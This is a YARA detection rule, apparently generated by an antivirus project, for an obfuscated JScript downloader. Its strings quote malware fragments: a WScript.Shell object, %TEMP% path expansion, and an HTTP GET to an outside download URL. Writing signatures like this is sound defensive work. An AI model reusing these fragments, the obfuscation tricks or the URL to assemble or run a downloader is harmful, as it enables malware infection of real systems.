rule sig_20160427_655176af7266e9af0ccd3b3cc5f90758 {
  meta:
    description = "datamaliciousorder - file 20160427_655176af7266e9af0ccd3b3cc5f90758.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e62e5763c663b9fe8ad1309841c5e8031f1323b7efb59824663d43e084c1cfc8"

  strings:
    $s1  = "function YulweLmzek() {return AoklcUnqwz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Aq3tgpu" ascii
    $s2  = "function YulweLmzek() {return AoklcUnqwz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Aq3tgpu" ascii
    $s3  = "function NeyljNobhz(ZnwauLsbrb, NshhnUxctm){UyffuRzicv = UyffuRzicv * 1; return ZnwauLsbrb - NshhnUxctm;};" fullword ascii
    $s4  = "var AoklcUnqwz = function AeqykBohwk() {return JuxlvXwodp[WgykpDnebt](\"WScript\"+\".Shell\");}(), GomtaIohbw = 11;" fullword ascii
    $s5  = "KppklKmios[FozrnUmynz](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var JuxlvXwodp = this[\"WScript\"];" fullword ascii
    $s7  = "if (KppklKmios[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function HvncgGyxql(){return SujjnHxddu + \"\";};" fullword ascii
    $s9  = "function IuxikBitkv() {return ((YajmyNbyas == true) && (YajmyNbyas == FahcqObpwc)) ? 1 : UyffuRzicv;};" fullword ascii
    $s10 = "var UtymsOcgaa = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "LgkfiPjnii = true;" fullword ascii
    $s12 = "}while (XzchrSgkiw);" fullword ascii
    $s13 = "YajmyNbyas = true; " fullword ascii
    $s14 = "return NeyljNobhz(FpxfqUeuqs, AbmwbAzpgh);" fullword ascii
    $s15 = "function GkqveRlsce()" fullword ascii
    $s16 = "function YzuzoUqkps(){return WgykpDnebt;};" fullword ascii
    $s17 = "FahcqObpwc = true; " fullword ascii
    $s18 = "var LgkfiPjnii = false;" fullword ascii
    $s19 = "function EvdysTwisl(){return 23;};" fullword ascii
    $s20 = "function VuvmoPwarp(CwbbmPkzmn) {var IxnlmWwjvj = (1, 2, 3, 4, 5, CwbbmPkzmn); return IxnlmWwjvj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}